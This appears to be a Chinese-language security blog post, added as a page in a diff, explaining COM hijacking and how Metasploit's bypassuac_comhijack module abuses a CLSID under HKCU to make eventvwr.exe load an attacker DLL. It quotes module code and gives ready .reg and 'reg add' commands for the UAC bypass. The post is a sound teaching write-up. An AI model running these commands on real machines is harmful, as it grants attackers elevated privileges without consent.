@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>COM Hijacking</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>本文介绍一下COM劫持的原理</p>
+<ul>
+<li>目录
+{:toc}</li>
+</ul>
+<h2 id="0x00-com介绍">0x00 COM介绍</h2>
+<p>COM是Component Object Model （组件对象模型）的缩写。</p>
+<p>COM是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。</p>
+<h2 id="0x01-应用程序与com注册表的关系">0x01 应用程序与COM注册表的关系</h2>
+<h3 id="注册表">注册表</h3>
+<p>首先需要介绍一下<a href="https://docs.microsoft.com/en-us/windows/desktop/sysinfo/about-the-registry">注册表</a>，注册表可以理解为一个树状结构的数据库，它具有一些特殊的数据类型用来存储一些数据满足应用程序的需要。</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HKEY_CLASSES_ROOT</td>
+<td>用于存储一些文档类型、类、类的关联属性。</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_CONFIG</td>
+<td>用户存储有关本地计算机系统的当前硬件配置文件信息。</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER</td>
+<td>用于存储当前用户配置项。</td>
+</tr>
+<tr>
+<td>HKEY_CURRENT_USER_LOCAL_SETTINGS</td>
+<td>用于存储当前用户对计算机的配置项。</td>
+</tr>
+<tr>
+<td>HKEY_LOCAL_MACHINE</td>
+<td>用于存储当前用户物理状态。</td>
+</tr>
+<tr>
+<td>HKEY_USERS</td>
+<td>用于存储新用户的默认配置项。</td>
+</tr>
+</tbody>
+</table>
+<p><strong><a href="https://docs.microsoft.com/en-us/windows/desktop/sysinfo/hkey-classes-root-key">HKEY_CLASSES_ROOT</a> = HKEY_LOCAL_MACHINE + HKEY_CURRENT_USER</strong></p>
+<h3 id="clsid">CLSID</h3>
+<p>首先需要介绍一下CLSID(Class Identifier)，中文翻译为：“全局唯一标识符”。</p>
+<p>CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。</p>
+<p>也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。</p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-14/0x00.png" alt=""></p>
+<p>按下Ctrl+R打开运行窗口，键入 <code>::{20D04FE0-3AEA-1069-A2D8-08002B30309D}</code>即可打开“我的电脑”</p>
+<p>回收站的CLISD是：<code>::{645FF040-5081-101B-9F08-00AA002F954E}</code></p>
+<h3 id="clsid是如何创建的">CLSID是如何创建的</h3>
+<p>CLSID结构体：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_GUID</span> {  
+	DWORD Data1; <span style="color:#75715e">// 随机数  
+</span><span style="color:#75715e"></span>	WORD Data2; <span style="color:#75715e">// 和时间相关  
+</span><span style="color:#75715e"></span>	WORD Data3; <span style="color:#75715e">// 和时间相关  
+</span><span style="color:#75715e"></span>	BYTE Data4[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// 和网卡MAC相关 
+</span><span style="color:#75715e"></span>	} GUID;  
+	<span style="color:#66d9ef">typedef</span> GUID CLSID;  <span style="color:#75715e">// 组件ID 
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">typedef</span> GUID IID;    <span style="color:#75715e">// 接口ID
+</span></code></pre></div><p>通过操作系统提供的结构体与API来创建CLSID，保障唯一性。</p>
+<h3 id="clsid-在注册表中的表现形式">CLSID 在注册表中的表现形式</h3>
+<p>常见CLSID Key：</p>
+<table>
+<thead>
+<tr>
+<th>Key Name</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>InprocHandler32</td>
+<td>指定应用程序使用的自定义处理程序</td>
+</tr>
+<tr>
+<td>InprocServer32</td>
+<td>注册32位进程所需要的模块、线程属性配置</td>
+</tr>
+</tbody>
+</table>
+<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   
+ 	{CLSID}       
+	InprocServer32          (Default) = path          
+	ThreadingModel 	    = value
+</code></pre><p><a href="https://docs.microsoft.com/zh-cn/windows/desktop/com/clsid-key-hklm">更多介绍</a></p>
+<h2 id="0x01-com-组件加载过程">0x01 COM 组件加载过程</h2>
+<p>使用<code>Process Monitor</code>可以清楚的看到应用程序的寻找过程：</p>
+<ul>
+<li>1.HKCU\Software\Classes\CLSID</li>
+<li>2.HKCR\CLSID</li>
+<li>3.HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</li>
+</ul>
+<blockquote>
+<p><code>HKCU</code>即<code>HKEY_CURRENT_USER</code></p>
+</blockquote>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-10-14/0x01.png" alt=""></p>
+<h2 id="0x02-com-组件劫持的原理">0x02 COM 组件劫持的原理</h2>
+<p>当进程寻找COM组件时，首先会寻找：
+<code>HKCU\Software\Classes\CLSID</code></p>
+<p>我们直接在CLSID下新建一个对象ID，就能够劫持某个进程或多个进程。</p>
+<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   
+ 	{CLSID}       
+	InprocServer32          (Default) = path          
+	ThreadingModel 	    = value
+</code></pre><p>与DLL劫持原理相近，但是COM组件的劫持可以拓展很多东西，劫持的目标不一定是一个进程，劫持所需的文件不一定是一个DLL，它可以是一个.com文件、二进制PE文件、DLL文件，劫持的目标也可以是一个Windows API。</p>
+<h2 id="0x03-com-组件劫持案例">0x03 COM 组件劫持案例</h2>
+<p><code>metasploit-framework/embedded/framework/modules/exploits/windows/local/bypassuac_comhijack.rb</code></p>
+<p>使用<code>bypassuac_comhijack</code>模块能够将属于Administrators组的普通用户提升至管理员权限。</p>
+<p>下面我们分析一下代码：</p>
+<p>首先它会检查payload和操作系统是否支持，然后检测是否是最高权限。</p>
+<p>根据你配置的payload来生成一个DLL木马：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">payload <span style="color:#f92672">=</span> generate_payload_dll({<span style="color:#e6db74">:dll_exitprocess</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>})
+    commspec <span style="color:#f92672">=</span> expand_path(<span style="color:#e6db74">&#39;%COMSPEC%&#39;</span>)
+    dll_name <span style="color:#f92672">=</span> expand_path(<span style="color:#e6db74">&#34;%TEMP%</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">#{</span>rand_text_alpha(<span style="color:#ae81ff">8</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">.dll&#34;</span>)
+</code></pre></div><p>COM劫持配置项：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">@@hijack_points <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>
+    {
+      name: <span style="color:#e6db74">&#39;Event Viewer&#39;</span>,
+      <span style="color:#e6db74">cmd_path</span>: <span style="color:#e6db74">&#39;%WINDIR%\System32\eventvwr.exe&#39;</span>,
+      <span style="color:#e6db74">class_ids</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;0A29FF9E-7F9C-4437-8B11-F424491E3931&#39;</span><span style="color:#f92672">]</span>
+    },
+    {
+      name: <span style="color:#e6db74">&#39;Computer Managment&#39;</span>,
+      <span style="color:#e6db74">cmd_path</span>: <span style="color:#e6db74">&#39;%WINDIR%\System32\mmc.exe&#39;</span>,
+      <span style="color:#e6db74">cmd_args</span>: <span style="color:#e6db74">&#39;CompMgmt.msc&#39;</span>,
+      <span style="color:#e6db74">class_ids</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;0A29FF9E-7F9C-4437-8B11-F424491E3931&#39;</span><span style="color:#f92672">]</span>
+    }
+  <span style="color:#f92672">]</span>
+</code></pre></div><p>该模块支持两种命令启动方式：</p>
+<ul>
+<li>%WINDIR%\System32\eventvwr.exe</li>
+<li>%WINDIR%\System32\mmc.exe CompMgmt.msc</li>
+</ul>
+<p>劫持的CLSID相同：<code>0A29FF9E-7F9C-4437-8B11-F424491E3931</code></p>
+<p>创建注册表：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby">target <span style="color:#f92672">=</span> @@hijack_points<span style="color:#f92672">.</span>sample
+    target_clsid <span style="color:#f92672">=</span> target<span style="color:#f92672">[</span><span style="color:#e6db74">:class_ids</span><span style="color:#f92672">].</span>sample
+    root_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span><span style="color:#66d9ef">CLSID_PATH</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">{</span><span style="color:#e6db74">#{</span>target_clsid<span style="color:#e6db74">}</span><span style="color:#e6db74">}&#34;</span>
+    inproc_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>root_key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">InProcServer32&#34;</span>
+    shell_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">#{</span>root_key<span style="color:#e6db74">}</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">ShellFolder&#34;</span>
+
+    registry_createkey(root_key, registry_view)
+    registry_createkey(inproc_key, registry_view)
+    registry_createkey(shell_key, registry_view)
+
+    registry_setvaldata(inproc_key, <span style="color:#66d9ef">DEFAULT_VAL_NAME</span>, dll_path, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
+    registry_setvaldata(inproc_key, <span style="color:#e6db74">&#39;ThreadingModel&#39;</span>, <span style="color:#e6db74">&#39;Apartment&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
+    registry_setvaldata(inproc_key, <span style="color:#e6db74">&#39;LoadWithoutCOM&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
+    registry_setvaldata(shell_key, <span style="color:#e6db74">&#39;HideOnDesktop&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;REG_SZ&#39;</span>, registry_view)
+    registry_setvaldata(shell_key, <span style="color:#e6db74">&#39;Attributes&#39;</span>, <span style="color:#ae81ff">0xf090013d</span>, <span style="color:#e6db74">&#39;REG_DWORD&#39;</span>, registry_view)
+
+    {
+      name:     target<span style="color:#f92672">[</span><span style="color:#e6db74">:name</span><span style="color:#f92672">]</span>,
+      <span style="color:#e6db74">cmd_path</span>: target<span style="color:#f92672">[</span><span style="color:#e6db74">:cmd_path</span><span style="color:#f92672">]</span>,
+      <span style="color:#e6db74">cmd_args</span>: target<span style="color:#f92672">[</span><span style="color:#e6db74">:cmd_args</span><span style="color:#f92672">]</span>,
+      <span style="color:#e6db74">root_key</span>: root_key
+    }
+</code></pre></div><p>注册表项分别是：</p>
+<ul>
+<li>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32</li>
+<li>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder</li>
+</ul>
+<p>InProcServer32中有Key：</p>
+<ul>
+<li>Default -&gt; %TEMP%\八位随机数.dll</li>
+<li>ThreadingModel -&gt; Apartment</li>
+</ul>
+<p>ShellFolder中有Key：</p>
+<ul>
+<li>LoadWithoutCOM -&gt; 空</li>
+<li>HideOnDesktop  -&gt; 空</li>
+<li>Attributes -&gt; 0xf090013d</li>
+</ul>
+<p>创建完毕后，会启动<code>cmd.exe /c eventvwr.exe</code>，接着会反弹回来一个管理员会话。</p>
+<p>
+<video src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/video/com_hijacking.mp4" controls="controls" width="500px">
+哎呀~ 换个浏览器试试吧！
+</video>
+</p>
+<h3 id="手动测试">手动测试</h3>
+<p>手动测试可以将以下文件保存为<code>test.reg</code>：</p>
+<pre><code>Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32]
+@=&quot;C:\\Temp\\calc.dll&quot;
+&quot;ThreadingModel&quot;=&quot;Apartment&quot;
+&quot;LoadWithoutCOM&quot;=&quot;&quot;
+
+[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder]
+&quot;HideOnDesktop&quot;=&quot;&quot;
+&quot;Attributes&quot;=dword:f090013d
+</code></pre><p>中间的<code>C:\\Temp\\calc.dll</code>可以更改为你想要注入的DLL路径（支持绝对路径）。</p>
+<p>也可以使用command方式：</p>
+<pre><code>reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;&quot; /t REG_SZ /d &quot;C:\Temp\calc.dll&quot; /f
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;LoadWithoutCOM&quot; /t REG_SZ /d &quot;&quot; /f
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v &quot;ThreadingModel&quot; /t REG_SZ /d &quot;Apartment&quot; /f
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &quot;HideOnDesktop&quot; /t REG_SZ /d &quot;&quot; /f
+reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v &quot;Attributes&quot; /t REG_DWORD /d f090013d /f
+</code></pre><h3 id="过程浅析">过程浅析</h3>
+<p><code>eventvwr.exe</code>将会寻找<code>{0A29FF9E-7F9C-4437-8B11-F424491E3931}</code>这个组件，而这个组件又需要加载<code>InProcServer32</code>指定的DLL，这个DLL的路径就是MSF上传的木马DLL。当DLL一旦加载到<code>eventvwr.exe</code>这个进程中，Windows会复制一个管理员的Access Token给这个DLL创建的进程。</p>
+<h2 id="0x03-bypass-uac的原理">0x03 Bypass UAC的原理</h2>
+<p>这个其实准备在后面深度剖析的，还是要解释一下。</p>
+<p>如果劫持<code>explorer.exe</code>能不能Bypass UAC呢？</p>
+<p>答案：不行</p>
+<p>因为<code>eventvwr.exe</code>如果是被管理员组的用户打开，将会自动提升权限，Windows中会有很多这类的应用程序。</p>
+<p>正是因为具有自动提升权限的属性，我们劫持后，就不会触发UAC了，直接获得有管理员权限。</p>
+<p>上面说的只是一种方式，还有多种方式，后面我将会介绍：UAC基础、如何挖掘Bypass UAC的方法。</p>
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
